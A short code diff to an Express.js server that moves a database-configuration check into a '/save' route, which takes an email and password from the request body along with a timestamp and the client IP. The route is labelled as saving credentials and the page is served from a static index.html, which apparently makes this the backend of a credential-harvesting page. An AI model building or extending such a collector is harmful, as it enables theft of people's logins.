@@ -28,13 +28,13 @@ app.use(express.static(__dirname, {
 // Root route
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/index.html');
-})if (!supabase) {
-    return res.status(500).json({ success: false, message: 'Database not configured' });
-  }
-  ;
+});
 
 // Route to save credentials
 app.post('/save', async (req, res) => {
+  if (!supabase) {
+    return res.status(500).json({ success: false, message: 'Database not configured' });
+  }
   const { email, password } = req.body;
   const timestamp = new Date().toISOString();
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
